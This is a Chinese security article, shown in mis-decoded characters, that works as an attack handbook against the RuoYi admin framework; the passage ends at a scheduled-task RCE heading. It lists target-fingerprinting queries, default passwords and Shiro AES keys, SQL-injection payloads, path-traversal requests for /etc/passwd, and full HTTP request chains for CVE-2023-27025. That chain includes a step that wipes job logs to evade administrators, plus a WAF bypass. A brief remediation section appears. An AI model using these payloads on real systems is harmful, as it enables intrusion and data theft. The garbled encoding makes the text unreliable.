> **åŸæ–‡é“¾æ¥**: https://mp.weixin.qq.com/s?__biz=MzkxMzMyNzMyMA==&mid=2247573270&idx=1&sn=604d3b689ad54f42bc3af950d655e5fb

#  è‹¥ä¾(RuoYi)æ¡†æ¶æ¼æ´æˆ˜äº‰æ‰‹å†Œ  
ç‚¹å‡»å…³æ³¨ ğŸ‘‰  é©¬å“¥ç½‘ç»œå®‰å…¨   2025-06-16 09:01  
  
![](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAk1nlByTOFiahZKGHekfZGC180aw53rHwCE1KXCFEyHULHRFVH3sTdiaibVFgTPic4UWScria3Vocb1TyQ/640?wx_fmt=png&from=appmsg "")  
  
å½“ä½ åœ¨ç”¨è‹¥ä¾æ—¶ï¼Œé»‘å®¢å·²ç»åœ¨ç”¨Shiroé»˜è®¤å¯†é’¥å¼¹ä½ çš„Shellï¼›å½“ä½ è¿˜åœ¨çº ç»“åˆ†é¡µæŸ¥è¯¢ï¼Œæ”»å‡»è€…å·²é€šè¿‡SQLæ³¨å…¥æ¥ç®¡æ•°æ®åº“ï¼›è€Œä½ ä»¥ä¸ºå®‰å…¨çš„å®šæ—¶ä»»åŠ¡ï¼Œä¸è¿‡æ˜¯ä»–ä»¬æ‹¿ææœåŠ¡å™¨çš„ç©å…·ã€‚è¿™ä»½æ‰‹å†Œï¼Œå¸¦ä½ ç”¨æ¸—é€çš„è§†è§’ï¼Œè§£å‰–è‹¥ä¾çš„æ¯ä¸€å¤„è‡´å‘½å¼±ç‚¹â€”â€”å› ä¸ºçœŸæ­£çš„å®‰å…¨ï¼Œå§‹äºçŸ¥æ™“å¦‚ä½•æ¯ç­å®ƒã€‚  
# 0x00 å‰è¨€  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3NdvoicecUGKL6Q2VcpuIiaU4KkiapPo3bvwy7z8kQXWj46aRg0hU69XDHqXH1g/640?wx_fmt=png&from=appmsg "")  
## ç®€ä»‹  
  
Ruoyiï¼ˆè‹¥ä¾ï¼‰æ˜¯ä¸€æ¬¾åŸºäºSpring Bootå’ŒVue.jså¼€å‘çš„å¿«é€Ÿå¼€å‘å¹³å°ã€‚å®ƒæä¾›äº†è®¸å¤šå¸¸è§çš„åå°ç®¡ç†ç³»ç»Ÿæ‰€éœ€çš„åŠŸèƒ½å’Œç»„ä»¶ï¼ŒåŒ…æ‹¬æƒé™ç®¡ç†ã€å®šæ—¶ä»»åŠ¡ã€ä»£ç ç”Ÿæˆã€æ—¥å¿—ç®¡ç†ç­‰ã€‚Ruoyiçš„ç›®æ ‡æ˜¯å¸®åŠ©å¼€å‘è€…å¿«é€Ÿæ­å»ºåå°ç®¡ç†ç³»ç»Ÿï¼Œæé«˜å¼€å‘æ•ˆç‡ã€‚  
  
è‹¥ä¾æœ‰å¾ˆå¤šç‰ˆæœ¬ï¼Œå…¶ä¸­ä½¿ç”¨æœ€å¤šçš„æ˜¯Ruoyiå•åº”ç”¨ç‰ˆæœ¬ï¼ˆRuoYiï¼‰ï¼ŒRuoyiå‰åç«¯åˆ†ç¦»ç‰ˆæœ¬ï¼ˆRuoYi-Vueï¼‰ï¼ŒRuoyiå¾®æœåŠ¡ç‰ˆæœ¬ï¼ˆRuoYi-Cloudï¼‰ï¼ŒRuoyiç§»åŠ¨ç‰ˆæœ¬ï¼ˆRuoYi-Appï¼‰ã€‚  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3Ndvoicc4icOxXrfGasKOyibD6FyF6aTZHq4YhtWT8YADkMPWaIaJicApgYl6RWQ/640?wx_fmt=png&from=appmsg "")  
## é…åˆruoyiçš„æœåŠ¡ï¼š  

```
alibaba druid Â  Â  Â  Â  Â 
alibaba nacos Â  Â  Â  Â  Â 
spring Â  Â  Â  Â  Â  Â 
redis Â  Â  Â  Â  Â  Â 
mysql Â  Â  Â  Â  Â  Â 
minio Â  Â  Â  Â  Â  Â 
fastjson Â  Â  Â  Â  Â  Â 
shiro Â  Â  Â  Â  Â  Â 
swagger-ui.html Â  Â  Â  Â  Â 
mybatis

```

## æœç´¢è¯­æ³•  
  
FOFAï¼š  

```
(icon_hash=&#34;-1231872293&#34;Â || icon_hash=&#34;706913071&#34;)

```

  
Hunterï¼š  

```
web.body=&#34;è‹¥ä¾åå°ç®¡ç†ç³»ç»Ÿ&#34;

```

## ç¯å¢ƒæ­å»º  
  
æ–°å»ºæ–‡ä»¶å¤¹ï¼Œæ‹‰èµ·ruoyiæºç   

```
gitÂ cloneÂ https://gitee.com/y_project/RuoYi

```

  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3Ndvoicpic2bajIbcBjWmzp2bckRLIuSVrnWy42S7tDFEUgwbTtRL6ObWs2dBQ/640?wx_fmt=png&from=appmsg "")  

```
cd RuoYiÂ 
åˆ‡æ¢ç‰ˆæœ¬
git tag -l
åˆ‡æ¢
git checkout v4.5.1

```

  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3NdvoicSGc50U1p8f2fSke4lrhKCJddY1HjvHYUSHKjgN0ogAAMpE4nPWLGgg/640?wx_fmt=png&from=appmsg "")  
![]( "")  
![]( "")  
  
æ¥ä¸‹æ¥ç”¨ideaæ­å»ºçš„  
mysqlæ­£å¸¸ç”¨phpstudyæ­å»ºå°±è¡Œ  
æ—¥å¿—å­˜æ”¾è·¯å¾„éœ€è¦ä¿®æ”¹  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3NdvoicstUhlsTAVJwTnmPkVuGibic8EDP7uLkKy7UDHgUTOLoo4YQjtNxH2Lew/640?wx_fmt=png&from=appmsg "")  
  
é…ç½®mysql  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3NdvoicZZwNTOb0UA4ADmx18VDAl6I6H6PHv0gcE9I6HKZLesEMPNKfIGbsDw/640?wx_fmt=png&from=appmsg "")  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3Ndvoicr89TXlMx0s8Xh7BnvN2gdmsZTyPA3WZkchPvneFVqNqPSyHoWmrfvA/640?wx_fmt=png&from=appmsg "")  
![]( "")  
![]( "")  
  
å¯åŠ¨å³å¯ï¼Œé»˜è®¤ç«¯å£80  
# 0x01 å¼±å£ä»¤  

```
ç”¨æˆ·ï¼šadmin ruoyi druid Â  Â  Â  Â  Â  Â 
å¯†ç ï¼š123456Â admin druid admin123 admin888

```

# 0x02 Shiroé»˜è®¤å¯†é’¥  
## æ¼æ´ç®€ä»‹  
  
è‹¥ä¾é»˜è®¤ä½¿ç”¨shiroç»„ä»¶ï¼Œæ‰€ä»¥å¯ä»¥è¯•è¯•shiroç»å…¸çš„rememberMeæ¼æ´æ¥getshellã€‚  
## å½±å“ç‰ˆæœ¬  
  
RuoYi<V-4.6.2  
## æ¼æ´å¤ç°  
  
åœ¨é…ç½®æ–‡ä»¶ä¸­ï¼Œèƒ½å¤Ÿçœ‹åˆ°shiroçš„å¯†é’¥æ˜¯åœ¨é…ç½®æ–‡ä»¶ä¸­çš„  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3Ndvoic7icyibCKZuSeZcQmSMMlITHsshMRTSG53quj2QzkN5lz5U1JPttD2iccQ/640?wx_fmt=png&from=appmsg "")  
  
æ¼æ´åˆ©ç”¨å·¥å…·åœ°å€  
https://github.com/SummerSec/ShiroAttack2  
- RuoYi-4.2ç‰ˆæœ¬ä½¿ç”¨çš„æ˜¯shiro-1.4.2åœ¨è¯¥ç‰ˆæœ¬å’Œè¯¥ç‰ˆæœ¬ä¹‹åéƒ½éœ€è¦å‹¾é€‰AES GCMæ¨¡å¼ã€‚  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3NdvoicWOFQsLXoy27GWRfKuYIib521r5492kDhu3fyDFRibQLj3yXib0yiahv4GA/640?wx_fmt=png&from=appmsg "")  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3NdvoicyHib5kOt8AZjp5mLVyValkvI1axw6RuUtbYeUdrw0NrB1f8VSqMEiahw/640?wx_fmt=png&from=appmsg "")  
  
<table><thead><tr style="box-sizing: border-box;background-color: rgb(255, 255, 255);border-top: 1.11111px solid rgb(216, 222, 228);"><th style="box-sizing: border-box;padding: 6px 13px;text-align: left;font-weight: 600;border-color: rgb(208, 215, 222);border-style: solid;border-width: 1.11111px;border-image: none 100% / 1 / 0 stretch;"><section style="margin-bottom: 24px;margin-top: 24px;"><span leaf="">RuoYi ç‰ˆæœ¬å·</span></section></th><th style="box-sizing: border-box;padding: 6px 13px;text-align: left;font-weight: 600;border-color: rgb(208, 215, 222);border-style: solid;border-width: 1.11111px;border-image: none 100% / 1 / 0 stretch;"><section style="margin-bottom: 24px;margin-top: 24px;"><span leaf="">å¯¹è±¡ç‰ˆæœ¬çš„é»˜è®¤AESå¯†é’¥</span></section></th></tr></thead><tbody><tr style="box-sizing: border-box;background-color: rgb(255, 255, 255);border-top: 1.11111px solid rgb(216, 222, 228);"><td style="box-sizing: border-box;padding: 6px 13px;border-color: rgb(208, 215, 222);border-style: solid;border-width: 1.11111px;border-image: none 100% / 1 / 0 stretch;"><section style="margin-bottom: 24px;margin-top: 24px;"><span leaf="">4.6.1-4.3.1</span></section></td><td style="box-sizing: border-box;padding: 6px 13px;border-color: rgb(208, 215, 222);border-style: solid;border-width: 1.11111px;border-image: none 100% / 1 / 0 stretch;"><section style="margin-bottom: 24px;margin-top: 24px;"><span leaf="">zSyK5Kp6PZAAjlT+eeNMlg==</span></section></td></tr><tr style="box-sizing: border-box;background-color: rgb(246, 248, 250);border-top: 1.11111px solid rgb(216, 222, 228);"><td style="box-sizing: border-box;padding: 6px 13px;border-color: rgb(208, 215, 222);border-style: solid;border-width: 1.11111px;border-image: none 100% / 1 / 0 stretch;"><section style="margin-bottom: 24px;margin-top: 24px;"><span leaf="">3.4-åŠä»¥ä¸‹</span></section></td><td style="box-sizing: border-box;padding: 6px 13px;border-color: rgb(208, 215, 222);border-style: solid;border-width: 1.11111px;border-image: none 100% / 1 / 0 stretch;"><section style="margin-bottom: 24px;margin-top: 24px;"><span leaf="">fCq+/xW488hMTCD+cmJ3aQ==</span></section></td></tr></tbody></table>  
- RuoYi-4.6.2ç‰ˆæœ¬å¼€å§‹å°±ä½¿ç”¨éšæœºå¯†é’¥çš„æ–¹å¼ï¼Œè€Œä¸ä½¿ç”¨å›ºå®šå¯†é’¥ï¼Œè‹¥è¦ä½¿ç”¨å›ºå®šå¯†é’¥éœ€è¦å¼€å‘è€…è‡ªå·±æŒ‡å®šå¯†é’¥ï¼Œå› æ­¤4.6.2ç‰ˆæœ¬ä»¥å,åœ¨æ²¡æœ‰è·å–åˆ°å¯†é’¥çš„è¯·æƒ…å†µä¸‹æ— æ³•å†è¿›è¡Œåˆ©ç”¨ã€‚  
  
# 0x03 SQLæ³¨å…¥  
### æ³¨å…¥ç‚¹1 /role/listæ¥å£ ï¼ˆ<V-4.6.2ï¼‰  
  
ç‰ˆæœ¬åŒä¸Š4.5.1  
é¦–å…ˆä»æºç åˆ†æä¸€æ³¢  
Mybatisé…ç½®ä¸€èˆ¬ç”¨#{}ï¼Œç±»ä¼¼PreparedStatementçš„å ä½ç¬¦æ•ˆæœï¼Œå¯ä»¥é˜²æ­¢SQLæ³¨å…¥ã€‚RuoYiåˆ™æ˜¯é‡‡ç”¨äº†${}é€ æˆäº†SQLæ³¨å…¥  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3NdvoicyIS6rRJZzdufjAuegCaicu1KBojmxibg8ptg1Jre0vt4Gtt7NwbJQUDw/640?wx_fmt=png&from=appmsg "")  
![]( "")  
![]( "")  
  
è·³è½¬  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3NdvoicaedrazeibicLR6oUQib5iboAwboQOVt8fuHC5suqskmYZkHmbAyvTzm9fQ/640?wx_fmt=png&from=appmsg "")  
![]( "")  
![]( "")  
  
è§£é‡Šä¸€ä¸‹ ${params.dataScope}  
  

```
${params.dataScope}
```

  
è¿™æ®µä»£ç æ˜¯MyBatisçš„åŠ¨æ€SQLä¹‹ä¸€ï¼Œä¸»è¦ç”¨äºåœ¨SQLæŸ¥è¯¢ä¸­åµŒå…¥å¤–éƒ¨å®šä¹‰çš„å­—ç¬¦ä¸²æˆ–å‚æ•°ã€‚è¿™é‡Œçš„
```
${...}
```

  
è¯­æ³•è¡¨ç¤ºå–å‡º
```
params
```

  
å¯¹è±¡ä¸­åä¸º
```
dataScope
```

  
çš„å±æ€§å€¼ï¼Œå¹¶å°†å…¶ç›´æ¥åµŒå…¥åˆ°SQLè¯­å¥ä¸­ã€‚  
  

```
ä¾‹å¦‚ï¼Œåœ¨ä¸€ä¸ªåŸºäºè§’è‰²æƒé™ç®¡ç†çš„ç³»ç»Ÿä¸­ï¼Œä¸åŒçš„ç”¨æˆ·å¯èƒ½æœ‰æƒé™æŸ¥çœ‹ä¸åŒçš„æ•°æ®è®°å½•ã€‚ç®¡ç†å‘˜å¯èƒ½å¯ä»¥æŸ¥çœ‹æ‰€æœ‰éƒ¨é—¨çš„è®°å½•ï¼Œè€Œæ™®é€šç”¨æˆ·åªèƒ½æŸ¥çœ‹è‡ªå·±éƒ¨é—¨çš„è®°å½•ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œ
```

  
dataScope
```
çš„å€¼å¯ä»¥æ˜¯ä¸€ä¸ªæ ¹æ®ç”¨æˆ·è§’è‰²åŠ¨æ€ç”Ÿæˆçš„SQLç‰‡æ®µï¼Œå¦‚
```

  
"AND dept_id IN (SELECT dept_id FROM user_dept_access WHERE user_id = #{userId})"
```
ï¼Œç”¨ä»¥é™å®šæŸ¥è¯¢ç»“æœåªåŒ…å«ç‰¹å®šéƒ¨é—¨çš„ç”¨æˆ·ä¿¡æ¯ã€‚
```

  
  
å¯ä»¥çœ‹åˆ°ï¼Œåœ¨æŸ¥è¯¢çš„æ—¶å€™ï¼Œuserçš„å±æ€§paramsæ˜¯mapï¼Œåœ¨xmlä¸­ï¼Œå°†dataScopeæ‹¼æ¥åˆ°sqlè¯­å¥å  
  
è¿›å…¥mapperå±‚  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3NdvoicicYZPuCjZmlpx4yZuDfoPjNqj8E87r1VJUBy5ycuTdZDl3OOXAJ6rGQ/640?wx_fmt=png&from=appmsg "")  
  
è·³è½¬åˆ°ä¸Šçº§  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3NdvoicwKjYR6U8N5qR6gNSlLwCGjjPkdjrXOa6jHicL5Qwo0Lh214zhk9SMtQ/640?wx_fmt=png&from=appmsg "")  
![]( "")  
![]( "")  
  
è¿›å…¥roleæŸ¥çœ‹ä¿¡æ¯  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3NdvoicYHfqvjFzXmBTCZtuFdwicXB8iao2HMiaXXJcu8dWiazpukVTfN6f3vIyxg/640?wx_fmt=png&from=appmsg "")  
![]( "")  
![]( "")  
  
æŸ¥çœ‹åŠŸèƒ½  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3Ndvoic8ouv3BF8QB5D8VCpB0HrEkMBfzj6W10ria3rsZF5YODialwUfj6IZM1A/640?wx_fmt=png&from=appmsg "")  
![]( "")  
![]( "")  
  
params  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3NdvoicH77lGG7hslFdWibILCzZwwuxWeOfMibOIicHztIru3RicbQ5Jmup9JyZOA/640?wx_fmt=png&from=appmsg "")  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3NdvoicRzUODQyB8lfEZk1MFNibdYNy2UaibOhxsFfta0lxIuPLsQiaZRicJAhjFA/640?wx_fmt=png&from=appmsg "")  
  
æ ¹æ®è·¯å¾„  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3NdvoicK5Je0vCCJtsn7c6UCNEHGel19z954VwrsYz3Ificctxkxlm4Qt4A4EA/640?wx_fmt=png&from=appmsg "")  
![]( "")  
![]( "")  
  
æ‰§è¡Œä»£ç   

```
&params[dataScope]=andÂ extractvalue(1,concat(0x7e,(select user()),0x7e))

```

  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3Ndvoic2U3iatpc04WAjWTmRVAeCzvtHmANZl5eD9j1OlhyTG7mSXCrE0Cppnw/640?wx_fmt=png&from=appmsg "")  
### æ³¨å…¥ç‚¹2 /role/export ï¼ˆ<V-4.6.2ï¼‰  
### æ³¨å…¥ç‚¹3 /user/list ï¼ˆ<V-4.6.2ï¼‰  
### æ³¨å…¥ç‚¹4 /user/list ï¼ˆ<V-4.6.2ï¼‰  
### æ³¨å…¥ç‚¹5 /dept/list ï¼ˆ<V-4.6.2ï¼‰  
### æ³¨å…¥ç‚¹6 /role/authUser/allocatedList ï¼ˆ<V-4.6.2ï¼‰  
### æ³¨å…¥ç‚¹7 /role/authUser/unallocatedList  
### æ³¨å…¥ç‚¹8 /dept/edit ï¼ˆ<V-4.6.2ï¼‰  

```
DeptName=xxxxxxxxxxx&DeptId=100&ParentId=555&Status=0&OrderNum=1&ancestors=0)or(extractvalue(1,concat(0,(select user()))));#

```

### æ³¨å…¥ç‚¹9 /tool/gen/createTableï¼ˆV-4.7.1-V-4.7.5ï¼‰  
  
å‚è€ƒ  
https://blog.takake.com/posts/7219/#2-3-10-%E6%80%BB%E7%BB%93  
# 0x04 CNVD-2021-01931ä»»æ„æ–‡ä»¶ä¸‹è½½  
#### æ¼æ´ç®€ä»‹  
  
ç™»å½•åå°åå¯ä»¥è¯»å–æœåŠ¡å™¨ä¸Šçš„ä»»æ„æ–‡ä»¶ã€‚  
#### å½±å“ç‰ˆæœ¬ï¼š  
  
RuoYi<4.5.1  
#### æ¼æ´å¤ç°  
  
ç”¨4.5.0ç‰ˆæœ¬  
ç›´æ¥æœç´¢å…³é”®å­—ï¼Œdownloadæ‰¾åˆ°å…·ä½“çš„controller  
è·¯å¾„  

```
/common/download/resource

```


```
/common/download/resource?resource=/profile/../../../../etc/passwd
/common/download/resource?resource=/profile/../../../../Windows/win.ini

```

  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3NdvoicCmaBEH6CeYLibJoMkWiaV7n3EpB7Wa4DOib0E7S7arJHUOicqNOwZQ7REA/640?wx_fmt=png&from=appmsg "")  
# 0x05 CVE-2023-27025 è‹¥ä¾ä»»æ„æ–‡ä»¶ä¸‹è½½  
## æ¼æ´ç®€ä»‹  
  
è¯¥æ¼æ´æ˜¯è‹¥ä¾ï¼ˆRuoYiï¼‰4.7.6 ç‰ˆæœ¬ä¸­å­˜åœ¨çš„Â **æƒé™ç»•è¿‡ + ä»»æ„æ–‡ä»¶ä¸‹è½½**  
Â ç»„åˆæ¼æ´ã€‚æ”»å‡»è€…é€šè¿‡åå°ç®¡ç†æ¥å£æ·»åŠ æ¶æ„å®šæ—¶ä»»åŠ¡ï¼Œä¿®æ”¹ç³»ç»Ÿé…ç½®æ–‡ä»¶è·¯å¾„ï¼Œç»•è¿‡ä¸‹è½½åŠŸèƒ½çš„ç™½åå•é™åˆ¶ï¼Œæœ€ç»ˆå®ç°ä»»æ„æ–‡ä»¶ä¸‹è½½ã€‚æ¼æ´æœ¬è´¨æ˜¯Â **æƒé™æ§åˆ¶ç¼ºå¤±**  
ï¼ˆå…è®¸ä½æƒé™ç”¨æˆ·æ“ä½œæ•æ„Ÿæ¥å£ï¼‰å’ŒÂ **è·¯å¾„æ ¡éªŒä¸ä¸¥**  
ï¼ˆæœªå¯¹åŠ¨æ€ä¿®æ”¹çš„é…ç½®è·¯å¾„è¿›è¡ŒäºŒæ¬¡æ ¡éªŒï¼‰çš„ç»¼åˆç»“æœã€‚  
## å½±å“ç‰ˆæœ¬  
- **è‹¥ä¾ï¼ˆRuoYiï¼‰<= 4.7.6**  
## åˆ©ç”¨æ¡ä»¶  
1. **æƒé™è¦æ±‚**  
ï¼š  
  
1. æ”»å‡»è€…éœ€è·å–ç®¡ç†å‘˜ Cookieï¼ˆå¦‚Â 
```
JSESSIONID
```

  
ï¼‰æˆ–å­˜åœ¨å…¶ä»–æƒé™ç»•è¿‡æ¼æ´ã€‚  
  
1. è‹¥åå°æ¥å£æœªæˆæƒå³å¯è®¿é—®ï¼Œåˆ™æ¼æ´å±å®³å‡çº§ä¸ºâ€œæœªæˆæƒä»»æ„æ–‡ä»¶ä¸‹è½½â€ã€‚  
  
1. **ç³»ç»Ÿé…ç½®**  
ï¼š  
  
1. ç›®æ ‡ç³»ç»Ÿå¯ç”¨äº†å®šæ—¶ä»»åŠ¡æ¨¡å—ï¼ˆé»˜è®¤å¼€å¯ï¼‰ã€‚  
  
## æ¼æ´å¤ç°  
#### æ·»åŠ ä»»åŠ¡ç»•è¿‡ç™½åå•ï¼ˆè‡ªå®šä¹‰ä¸‹è½½æ–‡ä»¶è·¯å¾„ï¼‰  

```
POST /monitor/job/add HTTP/1.1
Host:Â 10.40.107.67
Cookie: _tea_utm_cache_10000007=undefined; java-chains-token-key=admin_token; JSESSIONID=7c625b5d-cd39-49fd-87db-bbb64c596c1b
User-Agent: Mozilla/5.0Â (Windows NTÂ 10.0; Win64; x64) AppleWebKit/537.36Â (KHTML, like Gecko) Chrome/126.0.0.0Â Safari/537.36
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Content-type: application/x-www-form-urlencoded
Content-Length: 214
Connection: close

createBy=admin&jobId=161&jobName=test111&jobGroup=DEFAULT&invokeTarget=ruoYiConfig.setProfile('/Users/apple/Desktop/Locks/javafx.txt')&cronExpression=0%2F10+*+*+*+*+%3F&misfirePolicy=1&concurrent=1&status=0&remark=

```

- é€šè¿‡è°ƒç”¨Â 
```
ruoYiConfig.setProfile()
```

  
Â æ–¹æ³•ï¼Œå°†ç³»ç»Ÿé…ç½®æ–‡ä»¶è·¯å¾„åŠ¨æ€ä¿®æ”¹ä¸ºæ”»å‡»è€…æŒ‡å®šçš„è·¯å¾„ï¼ˆå¦‚Â 
```
/Users/apple/Desktop/Locks/javafx.txt
```

  
ï¼‰ã€‚  
  
- æ­¤æ“ä½œç»•è¿‡äº†ä¸‹è½½åŠŸèƒ½åŸæœ¬çš„â€œå›ºå®šç›®å½•ç™½åå•â€é™åˆ¶ï¼Œå°†ä¸‹è½½è·¯å¾„æŒ‡å‘è‡ªå®šä¹‰ä½ç½®ã€‚  
  
#### æ‰§è¡Œå®šæ—¶ä»»åŠ¡ï¼ˆè§¦å‘é…ç½®ä¿®æ”¹ï¼‰  

```
POST /monitor/job/run HTTP/1.1
Cookie: _tea_utm_cache_10000007=undefined; java-chains-token-key=admin_token; JSESSIONID=7c625b5d-cd39-49fd-87db-bbb64c596c1b
User-Agent: Mozilla/5.0Â (Windows NTÂ 10.0; Win64; x64) AppleWebKit/537.36Â (KHTML, like Gecko) Chrome/126.0.0.0Â Safari/537.36
Host:Â 10.40.107.67
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Content-type: application/x-www-form-urlencoded
Content-Length: 9
Connection: close

jobId=117

```

- ç«‹å³æ‰§è¡ŒÂ 
```
jobId=117
```

  
Â å¯¹åº”çš„å®šæ—¶ä»»åŠ¡ï¼Œè§¦å‘Â 
```
ruoYiConfig.setProfile()
```

  
Â æ–¹æ³•è°ƒç”¨ï¼Œå®Œæˆé…ç½®æ–‡ä»¶è·¯å¾„çš„ä¿®æ”¹ã€‚  
  
- ä¿®æ”¹åï¼Œç³»ç»Ÿå°†ä»æ–°çš„é…ç½®è·¯å¾„ï¼ˆæ”»å‡»è€…æŒ‡å®šè·¯å¾„ï¼‰è¯»å–æ–‡ä»¶ã€‚  
  
#### æ¸…ç†ä»»åŠ¡æ—¥å¿—ï¼ˆæ“¦é™¤æ”»å‡»ç—•è¿¹ï¼‰  

```
POST /monitor/jobLog/clean HTTP/1.1
Cookie: _tea_utm_cache_10000007=undefined; java-chains-token-key=admin_token; JSESSIONID=7c625b5d-cd39-49fd-87db-bbb64c596c1b
User-Agent: Mozilla/5.0Â (Windows NTÂ 10.0; Win64; x64) AppleWebKit/537.36Â (KHTML, like Gecko) Chrome/126.0.0.0Â Safari/537.36
Host:Â 10.40.107.67
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Content-type: application/x-www-form-urlencoded
Content-Length: 0
Connection: close


```

- åˆ é™¤ä»»åŠ¡æ‰§è¡Œæ—¥å¿—ï¼Œé¿å…ç®¡ç†å‘˜å‘ç°æ¶æ„ä»»åŠ¡è®°å½•ã€‚  
  
- æ­¤æ­¥éª¤éæ¼æ´å¿…è¦ç¯èŠ‚ï¼Œä½†å¸¸ç”¨äºéšè”½æ”»å‡»è¡Œä¸ºã€‚  
  
#### è§¦å‘ä»»æ„æ–‡ä»¶ä¸‹è½½  

```
GET /common/download/resource?resource=2.txt HTTP/1.1
Cookie: _tea_utm_cache_10000007=undefined; java-chains-token-key=admin_token; JSESSIONID=7c625b5d-cd39-49fd-87db-bbb64c596c1b
User-Agent: Mozilla/5.0Â (Windows NTÂ 10.0; Win64; x64) AppleWebKit/537.36Â (KHTML, like Gecko) Chrome/126.0.0.0Â Safari/537.36
Host:Â 10.40.107.67
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: close


```

- ä¸‹è½½åŠŸèƒ½ä»…æ ¡éªŒâ€œé…ç½®æ–‡ä»¶ä¸­çš„è·¯å¾„â€ï¼Œæœªå¯¹åŠ¨æ€ä¿®æ”¹åçš„è·¯å¾„è¿›è¡ŒäºŒæ¬¡ç™½åå•æ ¡éªŒã€‚  
  
## bypass  
  
å¯¹è·¯å¾„å‚æ•°è¿›è¡Œ URL ç¼–ç æˆ– Unicode ç¼–ç ï¼Œç»•è¿‡ WAF æ£€æµ‹ï¼š  

```
invokeTarget=ruoYiConfig.setProfile('%2F%65%74%63%2F%70%61%73%73%77%64')

```

## ä¿®å¤  
1. **å®˜æ–¹è¡¥ä¸**  
ï¼š  
  
1. å‡çº§è‹¥ä¾è‡³Â **4.7.6 ä»¥ä¸Šç‰ˆæœ¬**  
ï¼Œå®˜æ–¹å·²ä¿®å¤æƒé™æ ¡éªŒå’Œè·¯å¾„ç™½åå•é—®é¢˜ã€‚  
  
1. **ä»£ç çº§ä¿®å¤**  
ï¼š  
  
1. **æƒé™æ ¡éªŒ**  
ï¼šå¯¹Â 
```
/monitor/job/add
```

  
Â ç­‰åå°æ¥å£æ·»åŠ ä¸¥æ ¼çš„è§’è‰²æƒé™æ§åˆ¶ã€‚  
  
1. **æ–¹æ³•é»‘åå•**  
ï¼šç¦æ­¢Â 
```
invokeTarget
```

  
Â å‚æ•°è°ƒç”¨æ•æ„Ÿç±»æ–¹æ³•ï¼ˆå¦‚Â 
```
ruoYiConfig.setProfile
```

  
ï¼‰ã€‚  
  
1.   
1. **è·¯å¾„äºŒæ¬¡æ ¡éªŒ**  
ï¼šåœ¨ä¸‹è½½åŠŸèƒ½ä¸­å¼ºåˆ¶æ ¡éªŒæ–‡ä»¶è·¯å¾„æ˜¯å¦åœ¨åˆæ³•ç™½åå•å†…ã€‚  
  
1. **ä¸´æ—¶ç¼“è§£**  
ï¼š  
  
1. ç¦ç”¨åå°ä»»åŠ¡è°ƒåº¦åŠŸèƒ½ï¼Œæˆ–é™åˆ¶Â 
```
monitor
```

  
Â æ¨¡å—çš„è®¿é—®æƒé™ã€‚  
  
1. éƒ¨ç½² WAF æ‹¦æˆªåŒ…å«Â 
```
ruoYiConfig.setProfile
```

  
Â ç‰¹å¾çš„è¯·æ±‚ã€‚  
  
# 0x06 å®šæ—¶ä»»åŠ¡RCE  
  
ç”±äºè‹¥ä¾åå°è®¡åˆ’ä»»åŠ¡å¤„ï¼Œå¯¹äºä¼ å…¥çš„â€œè°ƒç”¨ç›®æ ‡å­—ç¬¦ä¸²â€æ²¡æœ‰ä»»ä½•æ ¡éªŒï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥è°ƒç”¨ä»»æ„ç±»ã€æ–¹æ³•åŠå‚æ•°è§¦å‘åå°„æ‰§è¡Œå‘½ä»¤ã€‚  
## 0x01 ç®€ä»‹  
  
